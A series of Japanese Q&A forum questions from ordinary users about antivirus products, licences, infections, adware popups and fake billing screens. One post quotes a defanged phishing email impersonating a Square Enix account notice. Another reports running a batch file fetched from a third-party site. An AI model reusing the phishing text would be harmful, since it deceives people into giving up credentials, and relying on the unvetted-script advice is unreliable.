キングソフトのような総合セキリュティソフトありませんか？無料で使えるやつです。 ３０日間体験版とかではなくずっと無料で使えるソフトです。 「アバスト！」ってのをDLしたのですがこれも３０日しか使えないようです。 オススメの無料総合セキュリティソフトを教えてください。日本語だと良いです。
先日パソコンがウイルスに感染しました。 なんとかパソコンを正常にもどしましたが・・・？ また最近変なことがおこります 例えば動画をみていると画面がかたまり ぴーぃぃぃという音が鳴り続けるとか・・ なので安くてインストールしても ネットがサクサク作動して重くならないウイルスソフトを入れたいと思います。 今現在ネットをしているとノートンなんとかというウイルスソフトが 更新しないかと聞いてきますが それをも含めてお勧めのソフトを教えてください。 パソコンはウインドウズ７　です よろしくお願いします。
少し前、私の友人のtwitterからメッセージが届いており、iPhoneで添付されているファイルを開くとどこかのHPに繋がるようになっていたのですが、実際には「そのページは存在しません」と出ました。 何だったんだろうと思って、最近友人に聞いてみると「乗っ取られていた、そっちにもメッセージいったんだったら無視しておいて！」と言われました。 しかし既に開いたので、もしかして何かウイルスにでも感染してしまったということもあるのだろうか？と。でも実際にはページは存在しませんとなっていたし、iPhoneで開いたものだから大丈夫なのかな？とか色々と考えています。 iPhoneはあまりウイルスとか聞きませんが、可能性は低いですよね？ そしてもし感染しているとすれば、何かチェック方法などありますでしょうか？ 詳しい方、よろしくお願いいたします。
インターネット環境のウィルス対策として、有料ソフトを検討しています。 これまでは、保険＆サポート付きのウィルスバスター３年物を契約していました。 しかし、１度感染した時にサポートをうけようとしたら、あまり親身でなかったこともあり、 更新期限が近づいたので、新たにD-DATAかESETをダウンロードして購入しようと考えています。 そこで質問です。 ソフト各社のホームページでよくよく検討すると、有効期間が３年物と１年物がありますが、あまり金額的に差がないように思います。 だったら３年物がお得かと思うのですが？ それぞれメリット、デメリットを教えてください。 初心者なもので、よろしくご指導ください。
カスペルスキーと言う無料ソフトをDLして使っていますが無料版だとファイヤーウォールは保護されないようですね。 それで気になって、 スタート→コントロールパネル→セキリュティーセンター→Windowsファイヤーウォール とクリックすると 「関連性が無い為・・・Windowsファイヤーウォールを実行しますか？」 と表示されます。 「はい」 をクリックするとファイヤーウォール有効になっている画面が表示されます。 しかし、これって毎回PCを使うたびに とクリックすると 「関連性が無い為・・・Windowsファイヤーウォールを実行しますか？」 「はい」 って設定しないと有効化されないのですか？ よくわからないので教えてください。 OSはXPです
ルータがあればパソコンにハッカーに侵入されませんか？
現在、トレンドマイクロ社のウイルスバスター2012を利用していますが、今年の６月で使用期限を迎えます。 ネット広告で、キングソフト社の「インターネットセキュリティ2013」が無料でインストールできるとなっているのを知りました。 一生無料となっているので、非常に魅力的でありインストールしたいと思っていますが、安全性やセキュリティの機能は大丈夫なのでしょうか。 ご存知の方がいらっしゃいましたら教えてください。
　 Microsoft Security　Essetialsの更新時に、添付画像のエラーが出てきてMicrosoft Security　Essetialsの更新ができません。 何が原因でしょう。 どうしたらよいでしょう。 　
データを渡す為に他人のPCに外付けHDDを接続したら、外付けHDD内のいくつかのフォルダが勝手に.exeファイルに変換されてしまいました。 具体的には外付けHDD内の 【★★★】 というフォルダ名が 【★★★.exe】 という名前に変換されてしまいました。 クリックするとウイルス駆除ソフトが警告を鳴らし、そのままフォルダを駆除し、フォルダごと見えなくなってしまいました。 隠しフォルダを表示にすると、駆除されたフォルダは見えるのですが、これはウイルスなのでしょうか？ ちなみに、フォルダは隠しフォルダにされていますが、そのフォルダ内のファイルは隠しファイルにされていません。 ウイルス検索ソフトを外付けHDDにかけていますが、何も検索されません。 ウイルスだとしたら、どのような悪さをするウイルスでしょうか？ また、今後どのように対処したらよいか教えてください？ 1．不可視化されたフォルダを別のHDDへコピーして、外付けHDD内の不可視化されたフォルダを削除する。 2．ファイルすべてをバックアップを取り、外付けHDDを初期化する。 以上、よろしくお願いします。
最近、PCを起動すると「コンピューターに感染ファイルが見つかりました」などのメッセージが表示され、RegClean Pro というソフトのダウンロードを促されます。 以前にも「SPEEDOMYPC」とかいうソフトのこのような悪徳メッセージが表示されたのでアンインストールしました。 RegClean Pro が同じメーカーなのかわかりませんが、「SPEEDOMYPC」はアンインストールしているはずでRegClean Pro というソフトはインストールしていません。 この表示を消すにはどうすればいいでしょうか？
暴露ウィルスに感染したとして、その時にアップロードされると困る一部のフォルダ(デスクトップフォルダ等)をアップロードされないようにすることはできるでしょうか？ 設定したフォルダについてはアップロードを禁止できるセキュリティソフトがあればよいのですが。
コンピュータウィルスでPCを物理的に使えなくすることは可能ですか？ 一般のウィルスはリカバー機能や、フォーマット＆再インストールなどで復活は可能だと思うのですが。
EmobileのポケットWifiでネットをしていますが安心パックにはいるとEMセキュリティライトというソフトを使えるようです。ノートンのアンチウィルスソフトですがFirewallもないしUSB のウィルススキャンもできないようです。 こんなしょぼいソフトでネットしても大丈夫でしょうか？それともフリーのComodoのFirewallを併用すれば大丈夫でしょうか？
素人でも使用しやすく、それなりに優秀なフリーのウィルス対策ソフトありますか？
autoinfo_jpあっとまーくaccount.square-enix.com 上記のアドレス（あっとまーくは@）から下記のようなメールが来ました。（httpを削っています） ↓↓↓↓↓↓↓ここから↓↓↓↓↓↓↓ スクウェア·エニックスアカウント管理システム あなたのスクウェア·エニックスアカウントの異常、ログインしてください：://secure.square-enix.jp/account/app/svc/Login.html?cont=account 商品やサービス側に関連するサポート情報 スクウェア·エニックスサポートセンター ://secure.square-enix.jp ※サイト、検索機能の様々な製品やサービスの利用 サポート情報は確認した。 スクウェア·エニックスサポートセンターのご意見やご要件、ご使用ください ↑↑↑↑↑↑↑ここまで↑↑↑↑↑↑↑ 明らかに不自由な日本語で、アドレスが本物と比べてhttpsではないです。（これが本物→https://secure.square-enix.com/account/app/svc/L …） また、本物からログインしようとしてみましたが、メールが送られてきたアドレス自体が登録されていないようです。 詐欺の可能性が高そうなので無視するべきだと思いますが、 最近別サービスのアカウントが不正ログインされて同じようなメールからパスワードを変更して事なきを得たので無視して良いものか迷っています。 アドレスを踏む以外確かめようがないですが、どうすべきでしょうか。
攻撃の主な対象となり問題視されてるjavaですが、これってwindows8にプリインストールされてるんでしょうか？メーカー製ではなくアマゾンの1/31までの安売りで買ったwindows8アップグレード版です。windows8はflashを内蔵しているようですがjavaは内蔵していますか？
ウィルスに感染して、パソコン内にあるフォルダに実行コードまたはスクリプトを追加された場合、ダブルクリックしてそのフォルダを開く操作をすると、実行コードまたはスクリプトは実行されるのかどうか、ご教示願います。
長々と複雑ですが、お分かりの方、お教えください。 Windows 8 に Norton 360 Online をインストールしています。 起動して、タイル画面からメールやIEを起動する場合はいいのですが、自分でインストールしたソフト(Officeなど)を起動すると、以下のようなユーザーアカウント制御メッセージが出ます。 （１） 「次のプログラムにこのコンピュータへの変更を許可しますか？ プログラム名：Norton 360 確認済みの発行元：Symantec Corporation ファイルの入手先：このコンピューター上のハードドライブ 　はい　いいえ」 「はい」を選択すると （２） 「要確認の問題が起きました。 セットアップがNoton 360 のインストーラーを検出しました。 Noton 360 Online をアンインストールしてからNoton 360 のインストールを続行してください。 Ｗｅｂサイトのテクニカルサポートページに移動」 でＷｅｂサイトに移動すると （３） 「エラー: 「現在このコンピュータにインストール済みのバージョンよりも古い <製品名> をインストールしようとしています。」(Norton 製品のインストール時) お使いのNorton製品を選択してください。」 で、Noton360 をクリック （４） 「このエラーは、コンピュータに現在インストール済みの製品よりも古いNorton製品をインストールしようとしたときに表示されます。インストールを終了し、コンピュータにインストール済みの最新のNorton製品をお使いください。」 と出るので、Ｗｅｂサイトウィンドウを閉じると以下のメッセージが出ます。 （５） 「Norton Download Manager Norton 360 Online [再試行]をクリックするとインストールを続行します。」 そこで「インストールの中止」 を選択。 （６） 「Norton Download Manager を終了してよろしいですか？」 「はい」を選択。 ウィンドウを閉じると一連の流れが終了します。 （７） その後、ノートンのウィンドウを開くと、「サービスのアクティブ化をしてください。」 と出るので、クリックするとアクティブ化します。 （１）から（６）の流れが、起動するたびに毎回起こります。 （７）は流れには含まれないので、気が付かない時もあります。 ノートンをインストールしたばかりの時は、（１）で「はい」を選択しても、（２）のエラーにはならず、普通にインストールが続行できていました。（しかし、毎回起動するたびに（１）は表示されています） 実はこれまで数台のＰＣにインストールして使っていました、その時には具合よくいっていたのですが。（今回のライセンスは４件目ですが、以前から２つのライセンスを購入し、利用していますから、６台分利用できるはずです。） 何か設定がいけないのでしょうが、どこをいじったらいいのかよく分かりません。 どなたかお分かりの方、お教えください。 ASUS VivoBook X202E X202E-CT987G Windows 8　64ビット Norton 360 Online バージョン：20.3.1.22
２つ質問があります まず、１つ目の質問です ノートンの説明をパソコンにて見てると 有効期間中、1 台または指定された台数までのパソコンで本製品を使用する権利が付与されます。有効期間は製品を最初にインストールしてアクティブ化した時点から開始します。 とあります この場合 たとえば有効期間１年、３台分だとすると １．最初の１回をアクティブ化すると 残りの２台分の有効期間は開始してしまうのですか？ ２最初の１回をアクティブ化すると 残りの２台分は来年、再来年でもアクティブ化できるのですか？ どちらに解釈したらよろしいのでしょうか？ 次に２つ目の質問です 私のパソコンで ノートンインターネットセキュリティーを使ってます これを新しく購入せずに有効期間の途中から モバイル版のノートンに変更することってできませんよね？ よろしくお願いします
ウイルス対策ソフトがウイルスを検出するのは、 A そのウィルスが入ってきた時 B すでに侵入しているウィルスを新しいウィルス対策ソフト導入時に発覚 の2通りあると思います。 Bの場合は、感染以前への修復はウィルス対策ソフトの性能によると思いますが Aの場合は、ウィルスを検出すると、感染は低性能なウィルス対策ソフトでも阻止できるのでしょうか？ 上記と関係することですが、avast internet security でブラウザをサンドボックス化して使用したいのですが、ネットサーフィン中にavastがウィルスを検出した場合、ウィルスはサンドボックスの外の実環境に移動することになります。 検出したとき感染を阻止をできるなら実環境に移動しても問題ないのですが、検出後の感染を阻止できず実環境に移動したウィルスがサンドボックス外の実環境を変えてしまうことはありうるのでしょうか？ avastがウィルスを検出できなければ、ウィルスが活動するのはサンドボックス内なので問題ないのですが、検出によって実環境に移動するために逆にセキュリティ上の問題が発生することを心配しています。
当方PC初心者です。 ウィルスソフトの購入を考えており、まずは試用版を 使ってみることにしました。 カスペルスキー2013をインストールしたのですが、 その途端にネットに接続できなくなりました。 ただ、トラブルシューティングをすると 「デフォルトゲートウェイは使用できません」と メッセージが出てその後つながります。 しかしまたすぐに切断されてしまうので トラブルシューティングでまた接続…という繰り返しです。 これは何か設定を変更すれば解消される程度のこと でしょうか？ それとも単に私のPCとカスペとの相性が悪いということ なのでしょうか？ ちなみにESETの試用版を使ったときはこのような現象は ありませんでした。また、ESET、カスペの試用版を 入れる前はしばらく無料のavastを使っていましたが、 その時もこのような現象はありませんでした。 カスペのチェックが他のソフトより厳しすぎて起きている ということならそれはそれでうれしいのですが、 でも設定変更で対処できる問題でないとしたら 意味がないですよね… 念のため…PCはNEC、Core i5 3210M、osはwin７です。 接続に関しては室内にあるLANジャックに有線で差し込んでいます （プロバイダ等マンションで一括契約です）。 チェックすべき設定項目など教えていただけませんでしょうか。 よろしくお願いいたします。
Internet Explorerの右横に何故かRelated Searchesと言うものが表示されて困っています。 コントロールパネルなどから追加と削除を検索しても出てきませんし、 「ツール」->「アドオンの管理」 でも同じ様な文字は見つからないのですが、 どうしたら、消去できますでしょうか。 ご回答よろしくお願いいたします。
kaspersky2013を入れてOSやアプリのアップデートを最新にすればそれでセキュリティ状態は万全といえますか？
以前に、このサイトの質問で、ネットでエッチな動画見たときの「sugar キャンペーンのご案内」というダイアログを削除する方法についての話がありました。私もそれを参考にして、http://sasi40dx.cs.land.to/よりインストールをし、「del_1cw.bat」を実行したところ、ｃｍｄの画面は消えてしまい何の対処もされていません。何が悪いのかさっぱりわからず、途方に暮れています。どなたか、対処法を御存知の方いませんでしょうか？
（このパソコンは、質問の対象のパソコンではありません。） パソコンのできない母の代わりに、母の友人たちに 旅行のお知らせをメール送信しました。 その一人が母に、 「お宅のパソコンはウイルスに感染している。 それでうちのパソコンがメールを受信できなかった。 うちのパソコンはセキュリティが普通のパソコンよりかなり高いから 受信できなかったのだと思うから、普通に使っていてたぶん大丈夫だと思うけど、 一応お知らせしておきます。」 と電話で教えてくださったそうです。 びっくりしてすぐにウイルススキャンしましたが、 ウイルスは検出されませんでした。 安心していいものか、その方のおっしゃる通りなのか、 分からなくて困っています。 「普通に使って大丈夫だと思う」という意味も分かりません。 どういう状況と捉えるべきか、教えてください。 私はパソコンに対する理解レベルは、初心者です。 メールやネット、ワードなどは比較的自由に使えますが、 トラブルが起きた時に自分で解決する能力はほとんどない、と思います。 私に分かるように、なるべく噛み砕いて教えて頂けるとありがたいです。
MacbookAirとFusionを使ってWindowsを動作させた状態でMacとWindows両方でESETセキュリティを使いたいのですが、 パーソナル版とファミリー版の２つがあってどちらを買えば良いのか教えてください。
Nexus 7を買ったんですけど 隣にノートンありました これは買わないといけないですか？
yontoo-c4-.exeというファイル名の感染が確認されました。 現在の状態は「感染」 一時処理は「検疫」 二次処理は「放置する（ログのみ）」、 適用した処理「部分的」 検疫が部分的に完了しました。 となっております。 その後、シマンテックのウイルスソフトを最新の状態にしてから完全スキャンを行いましたが、特になにも出てきません。 しかし、検疫の表示という部分には未だ上記のようになっております。 解る方、今後どうしたら良いか教えてください。
というのは、どのような事が考えられるでしょうか？ 誰かが特定の人のPCに外部から意図的に仕掛けるという可能性はありますでしょうか？ ウイルススキャンで検出されたので、原因を知りたいのです。
以前の質問をご覧になられたら判ると思いますが、「IPアドレスで割り出せる情報は都道府県までだ」という事で、他に個人情報漏洩の原因を考察したら、「スパムウェアを仕込まれている可能性」に至ったので、Macのパソコンでウイルススキャンを行ったら、私の勘は見事に的中し、『Trojan.Malscript!gen』というウイルスに感染していたのですが、これはWindows用のウイルスらしいのです。何故にWindows用のウイルスがMacから検出されたのでしょうか？因みに、検出されたウイルスは削除致しました。 http://www.symantec.com/ja/jp/security_response/ … 私はメインでMacを使っており、サブでWindowsを使っておりますが、この二台のパソコンは１つのルーターから無線と有線で経由している為に、IPアドレスが同じなのです。iPadも使っておりますが、こちらも無線を経由しているのでMacとWindowsと同じ扱いになります。 つまり、これはWindowsのパソコンで感染したウイルスが同じルーターで共有しているMacのパソコンにも同時に感染したという事でしょうか？ 「Windowsだったら脅威的なウイルスですが、Macなら何の影響もない」と言われたのですが、同じルーターで共有している場合でも、何の問題もないのでしょうか？このウイルスから私の固定電話の番号を割り出される事は可能なのでしょうか？ そもそも、ウイルスに感染する原因というのは何が考えられますでしょうか？何者かが外部から仕掛けたという事でしょうか？
ウィルスバスタークラウドの利用者ですが、最近パソコンにウィルスが入ってきます。その数一週間で1000件ほど・・・ほとんどが削除されているのですが、4,5件「追加の駆除が必要です」となっています。続けるとウィルスバスターのTOPページが表示されるだけで、特に駆除方法が出てきません。チャットで365日安心サポート・・・とあるので、チャットを試みましたが、「混み合っているのでお待ちください」と30分以上待ってもつながりません。 あまりパソコンに詳しくない者なのですが、こういった場合の対処法をお教えください。 よろしくお願いします。
この「教えて！goo」を見るほか、yahooなどより記事が面白いので、gooをスタートページに設定しているのですが、最近、gooを出すと、必ずノートンのウィルスチェックが入り、「安全でないので削除しました」（隔離だったかな？）と出ます。このような現象を体験している人はいますか？何で、こうなるのでしょうか？鬱陶しいので、gooをスタートページにするのは止めようかなと考えています。
現在は無料のアバスト！を使っています。 これではネット銀行を使う上で(アバスト！が不安という訳ではなく、無料ソフト全般が)不安なので、有料ソフトの導入を検討しています。 ノートンのインターネットセキュリティにしようかと現時点では考えています。(体験版を使用してみて、とても使いやすかった)。 他におススメのウイルスソフトがあれば教えてください。宜しくお願いします。
自分でホームページを持っております。 ヤフーのジオシティにおいてあるホームページ開いたところ、訳のわからない英語のページに転送されました。 FTPで接続してみたところ、全てのhtmlファイルの日付が更新されているようでした。 何か改ざんでもされたかと思い、パソコンにあるファイルで、再度、上書きしたところ直りました。 パスワードを変更してみましたが、その後、他のURLのホームページも調べたところ、htmlファイルの更新日付が同様に変わっておりました。（こちらの方は、他のページに転送はされませんでした。） 何かスパイウェアとかウィルスとか遠隔操作とかされているのでしょうか？ 因みに、ウィルスバスターのオンラインスキャンでチェックしましたが、ウィルスに感染はされてないようです。
ウイルスバスターの更新手続きに関するDMがきました。3年契約が一番お得と書いてありました。 コンビニ等で振り込んだほうがいいのでしょうか？
ウィルスに感染して、パソコン内にあるファイルに実行ファイルを追加された場合について。 パソコン内のファイルには (A) 拡張子が.exeのような実行ファイル と. (B) 実行ファイルではなく拡張子がtxt,jpg,mp3,wmv,html,doc,xlsのような関連付けられたアプリケーションで開くファイル に分かれます。 (A)タイプのファイルに実行ファイルを追加されてしまった場合、そのファイルをダブルクリックして実行すると、追加された実行ファイル部分までも実行されてしまうのでしょうか？ (B)タイプのファイルに実行ファイルを追加されてしまった場合、そのファイルをダブルクリックして関連付けられたアプリケーションで開くと、追加された実行ファイル部分も実行されてしまうのでしょうか？(拡張子は実行ファイル形式にならずそのままとします)
パソコンで、Generic Host Process for Win32Servicesが複数起動しています。 ４つも、５つも起動しているのですが、これは通常有り得ることなのでしょうか？ 教えて頂けると助かります。よろしくお願いします。
Windows7デスクトップです、初心者です、アダルトサイトを見てたら、料金請求画像が出て来て、消しても、消しても、消えません、どの様な事をしてしまったのか、自分でも良く解かりません、何か保存とか、インストールして下さいとか、その要にしてしまった気がします、解決法在りませんか？
win8のPCを買いました。現在マカフィーの無料期間中です。 30日間なので、その後どのセキュリティソフトが良いか検討しております。 8にはWindows Defenderが標準で付いてるようですが 評判はどうでしょうか？ Windows Defenderだけで十分と言う方もいらっしゃいます。 セキュリティソフトに詳しい方、アドバイスお願い致します。
ある日突然、スタートボタンからIEを開く（常時　yahoo!に設定）と、画面が真っ黒になり、数秒でユーザーアカウント制限のダイアログが表示されるようになりました。 で、発行元、目的不明とか何とかの説明があるので、それを許可せずキャンセルすると、真っ黒画面が消えて、最初のポータル画面yahoo!　が表示されます。 検索などいろいろ作業の際のURLリンクをクリックしようとする度に、その都度、件のユーザーアカウント制限が出て、非常に面倒なことになってしまいました。 ユーザーアカウント制限のダイアログボックス内に、認識できない発行元と表示されているところに、ssvagent.exeと書いてあり、何かの原因（うっかりどこかをクリックしてしまったなど）でCドライブに格納されてしまったようです。 その表示は　C:\Program Files\・・・・・云々という具合です。 そこで質問ですが、これを削除するにはどのようにすれば良いでしょうか。専門知識に乏しくあまり詳しくありません。初心者向けな、簡単なご説明いただければ幸いです。 因みに、タスクバーにJABAとかなんかのコーヒーカップみたいなアイコンが突然出た時に、うっかりクリックしたのかも知れません。
セキュリティソフトのノートンですが、購入するとＰＣ３台まで登録できますが そのうちの１台を新しいＰＣにした場合、登録はどのようにして古いＰＣから 新しいＰＣに切り替えするのでしょうか？ 教えてください。
.mobi　がつくメールアドレス（例○○○○@○○slng.everyforwa.mobi）から毎日多数の迷惑メールが私のPCに送信されます。これは、OCNメールの迷惑メール対策サービスを潜り抜けて受信してしまいます。 ＠と.mobiとの間の文字（　．を含む）は種々のものがあります。 今までメールアドレスで受信拒否しましたが、追い付かず、＠の右側（ドメイン）を指定しても同様です。そこで思い切って、「.mobi」の付くメール」を全て受信拒否（迷惑メールとする）したら、他に問題が起こってくるでしょうか？　迷惑メール以外に　.mobiが付くメールを今まで受信したことはないのですが、.mobi　の性質等をよく理解していないので心配なのです。
セキュリティ超初心者という点でのお説教を覚悟で質問します。 アンチウィルスにavast!7、ファイアウォールにCOMODO6.1の組合せで インストールしていますが ＣＯＭＯＤＯをインストールしたら起動が極端に遅くなりました。 OSがWindowsXP(SP3)なのですが、ロゴが消えてから ユーザー選択画面が表示されるまで１分以上ブラックアウトしたままになってしまい、 ユーザーを選択してもそこから操作出来るようになるまで１分位かかります。 COMODOをアンインストールすれば起動速度は元に戻るので 完全にavast!の何かと干渉しているのだと思いますが 検索してもうまく対処方法がヒットしません。 この現象について分かる方はいらっしゃいますでしょうか。 対策を御存知の方がいらしたらどうぞ教えてくださいませ。 また、いっそのこと有料版のavast!を導入しようかとも考えています。 使い勝手など御存知でしたらお知恵を拝借ねがいます。 よろしくお願い致します。
XP Pro SP2, 自動更新無し, マルウェア対策ソフトウェア無しの環境です。 （SP3 では支障があったため SP2に戻された） Windows Update では、必要とみなされたものは手動で適用されています。（年２回） ○本機のインターネットブラウザは使用できません。 ○サーバーソフトウェアが稼働しています。 ○Windowsファイアーウォールのサーバソフトウェアのポートは開いています。 ○USBは塞がっています。 ○光学式のドライブは使われておりません。 ○特定のグループ権限でアクセスできる共有フォルダがあります。 ○LANプリンターに接続できます。 ○ブロードバンドルーターに接続されています。 ○本機からインターネットにアクセスする事は可能です。（ファイルを拾ってくることは可能です） 定期的に手動でLAN上の別のコンピュータから数種のマルウェア対策ソフトウェアにてスキャンされています。 （他のコンピュータのOSは多種多様） 今まで全てのマシンにおいてマルウェアが検出された事はございません。（検出テストを除く） サポートが終了してもマルウェアの心配は特に必要無いように思います。 なぜマルウェアに感染しないのでしょうか？
ノートンインターネットセキュリティ2013 同時購入1年版YAMADAエディション というのが2,000円弱で売ってます。 正規品との事です。俗に言う、海賊版みたいな物があるのでしょうか？ どうしてこんなに安いのでしょうか？ 定価も5,000円くらいだと思いますが、他社と比べて安いです。 その他、お勧めセキュリティソフトがありましたら 教えて下さい、宜しくお願い致します。 （初心者なので設定が簡単なものが良いです。）
Nortonの製品を使用しています。　（ルーターも使っています） セキュリティーソフトの侵入検知 ・ 侵入防止機能について教えてほしいです。 素人考えに、PCが立ち上がっていてセキュリティーソフトが働いている時は侵入検知 ・ 侵入防止機能も当然働いていますが、PCをシャットダウンしている間は（PCの電源が入っていないのに）どうして機能しているのだろうか？ と。 PCをシャットダウンしていてもネットには繋ぎっぱなしのことが多いと思います。　 １．侵入を試みようとする者は、PCが立ち上がっている・いないに関わらず攻撃してくるでしょうからシャットダウンしている間は無防備　では意味がなく、PCのシャットダウンしている間も侵入検知 ・ 侵入防止機能は働いていると思っていますが、そういう理解で良いでしょうか？ ２．（PCやセキュリティーソフトなどに詳しくないのでごく簡単な説明で良いのですが） １、の理解で良いとして、PCの電源が入ってないのに、なぜセキュリティーソフトの侵入検知 ・ 侵入防止機能は働けるのでしょうか？ トンチンカンな、あるいは既出の質問かも知れませんが、よろしくお願い致します。
sandboxieでブラウザを実行し、ブラウザでサイトを見ている時にトロイの木馬(バックドア型)が実行されてしまった場合、 wikipediaのトロイの木馬-バックドア型 http://ja.wikipedia.org/wiki/%E3%83%88%E3%83%AD% …(%E3%82%BD%E3%83%95%E3%83%88%E3%82%A6%E3%82%A7%E3%82%A2)#.E3.83.90.E3.83.83.E3.82.AF.E3.83.89.E3.82.A2.E5.9E.8B のように、リバース接続によって全く自由にパソコンを遠隔から操作されてしまうのですが サンドボックス化されたブラウザが終了するまでに遠隔操作で変えられる部分は、サンドボックス内のファイルだけで、サンドボックス外の実環境を変えることは出来ないのでしょうか？
MacOSX10.6.8でウイルスバスターのソフトを使っていますが、 ニコニコ動画など、ちょっと前までは観れていたのに、 今日半年ぶりくらいにニコニコ動画の曲をクリックして聴こうと思ったら「プラグインをブロックしました」と表示されるようになり、観れなくなりました。 ウイルスバスターの”常にアクセスを許可するwebサイト”の項目には、 ちゃんとニコニコ動画のURLがあり、一度もそこはいじっていません。 ちゃんと前のように動画を観るにはどうしたら良いのでしょう？ 困っています；
私のPCではないですが、 友人から依頼されましたので 教えて頂きたいと思います。 最近、ネットを開くと 突然、 添付ファイルのようなウインドウがどちらか開くそうです。 結構、頻繁に起こってるので 何とかしたいのですが、 skypeを入れたことしかしてないので その時？！かどうかは定かでないのですが、 これをなくすにはどうしたらいいでしょうか？ ※尚、友人が他府県にいますので 操作方法など、説明してる場所もあると非常に助かりますが、 なければ、調べます。 ちなみにPCはWin7 Homeです。 ウイルス対策はソースネクストのウイルスセキュリティです。
現在使用中のＰＣのＯＳは WindowsXP で　来年４月に　Ｕｐｄａｔｅ　Ｓｕｐｐｏｒｔ　が中止されます。そこで新しくＰＣを買うべく調べますと　ＯＳは総て　Windows－８となっています。　一方現在使用中の周辺機器（Ｐｒｉｎｔｅｒ，Ｓｃａｎｎｅｒ）のＤｒｉｖｅｒ　Ｓｏｆｔ は　Windows－８　ではサポートされていなくて困っています。 最も良い方法は　現在のＰＣ（ＸＰ）のまま使い続け　新たに　ＢＩＧＬＯＢＥ　のセキュリティー契約を導入して　安全が確保されるならば　とても安心なのですが　如何でしょうか？　ＰＣの買い替えも必要なくなります。　宜しくご返事を下さい。
先日Nortonの延長サービスに申し込んで、次の日にパソコンを立ちあげるとNortonのダイアログボックスが出て、 「脅威が検出されました」と出ていました。 削除するようにしても、「削除できませんでした」と出てしまいます。 Nortonのシステムの完全スキャンをすると、ウイルスとして検出され、そこでは「全面的に解決しました」と出ました。これでもう消されたと安心したのですが、 次の日またパソコンを起動すると、 また同じように「脅威が検出されました」と出ました。 またスキャンすると解決できるのですが、起動するたびに警告が出るので、どうすればいいか分からずいます。 スキャンした画面からのそのウイルスの情報では puia6h.exe 脅威名 Trojan.Gen ファイル：　g:\autorun.inf 未検出 感染ファイル：　g:\puia6h.exe 未検出 元の場所、ダウンロード元：　不明 とありました。 レジストリから削除するのが良いとあったのですが、自分で調べてするのはちょっと不安なので 分かりやすく教えていただけると助かります。 できればリカバリ以外の方法で消したいのですが、リカバリする場合は 今ドライブが3つあるのですが、そのうちのCドライブ（Windowsとかプログラムファイルが入っている）だけをリカバリしたのでよろしいですか？
今デスクトップパソコンとiPad mini　を持っています。 デスクトップの方は買ったときにウイルスバスター２０１１が入ってて今は無料体験中です。 もうすぐ無料期間が切れるのでお金を払って続けようか迷っています。 iPadの方は何もウイルス対策していません。 パソコン関係に詳しくないのでデスクトップ、iPadそれぞれおすすめ（なるべく安くで）の方法を教えていただけないでしょうか？ どうぞよろしくお願いいたします。
今現在は、(1)「BBセキュリティ powered by Symantec Plus」（月額598円）に加入しています。 実は、つい先月までは(2)「BBセキュリティ powered by Symantec」（月額514円）に加入しておりました。Plusにグレードアップしたのは、ＰＣのセキュリティ以外のバックアップやチューンアップ機能、そしてスマホのセキュリティや盗難対策機能に魅力を感じたためです。 ところで、オリジナルのシマンテックからは、(3)「ノートン３６０マルチデバイス」が発売されており、ＨＰ上でダウンロード3年版の限定特価で14,880円（通常価格は23,880円）となっております。 価格比較（3年間使用時）だと、(1)598円/月＊36か月＝21,528円　となり、(3)に比べて+6,648円も割高になります。（通常価格との比較では、(1)のが▲2,352円お得…） また、基本的な機能は同等？かと思いきや、よくよく調べてみると、違いがあります。 例えば、バックアップ機能で、(1)はローカルバックアップ（ＰＣのＤドライブ上）のみに対して、(3)はオンラインストレージ（25GB）があったり、スマホの盗難対策では、(1)がSMSからの遠隔操作のみ（盗難や紛失時には自分のＰＣでは対応できず、家族や友人頼みでしか対応できず…）に対して、(3)はPCからもできる？です。 価格、機能、サポートなどを考えると、オリジナルの(3)のが優れているような気がします。 当たり前と言えば当たり前ですね。 ただ、(1)の月額利用において、私の知らない、気づいてない利点があれば教えて下さい。 （基本的に何もしなくても常に最新の状態で利用できることぐらいしか自分には思いつきませんが、これは(3)でも3年間は同じことが言えるような気もしてます…） よろしくお願いします。
遠隔操作ウイルスも情報漏えいウイルスもOSやアプリの脆弱性を突くウイルスではありません。サポートがなくなったら危険だとマスコミは言ってるけど具体的にどう危険なのかの説明はほとんどありません。特権昇格とかリモートでコードがとかあるけれどそれって実は一般利用者にとって大した脅威ではないですよね。一般利用者が恐れているのは遠隔操作ウイルスや情報漏えいウイルスのようなダメージのデカいやつです。すべての情報は報道では明らかにされていませんが、報道されるその時まで遠隔操作ウイルスに最新定義のセキュリティソフトはどれも対応できていなかったという情報もあります。詳しい人に質問です。OSやPDFやFlashの脆弱性を放置したがために遠隔操作ウイルスや情報漏えいウイルスのような新聞で大きく書かれる事件につながったことはありますか？ また、なぜ脆弱性狙いのウイルスは大ごとにならないささやかなものばかりなのでしょうか？社会的に大問題になるウイルスが脆弱性を狙わない理由もご存知でしたら教えてください。
ウィンドウズ7 のパソコン買いました。 メールソフトは使わずにウェブメールを使っています。 考えられる危険性を教えて下さい。
アダルトサイトで謝ってファイル「実行」を押してしまいました。 それからポップアップで請求画面が消しても消しても出てきます。 どうしたらいいでしょうか。
タスクマネージャーのプロセスを見るとrundll32.exeというのが８個動いてます。 ちょっと前に見たときは３個動いててなんだろう？と思って調べてみるとrundll32.exeという名前の ウィルスもあるみたいで、不安になってきました。 ちなみにこのファイルの場所は \Windows\System32の中にrundll32.exe.muiとrundll32.exeがありました。 \Windows\SysWOW64の中にrundll32.exe.muiとrundll32.exeがありました。 それぞれのファイルの更新日時は数年前になってます、 system32とsysWOW64のフォルダをスキャンしました、何も検出されませんでした。 がプロセスに８個もあることって普通にあるんでしょうか？ pcはwin7 64bitです。
あたらしくWindows8搭載のPCを購入し、 avastをダウンロードしたところ、 一時的に無効にすることができません。 以前は、タスクバーにあるアイコンを右クリックすると、「10分間無効」などの表示がでたのですが、 「avast !free antivirus」「タクスバーからピン留めをはずす」「ウィンドウを閉じる」の三つの表示しかでません。▲などのなかに隠れているということもありません。 ご存じの方がいらっしゃったら、ご教示お願いします。
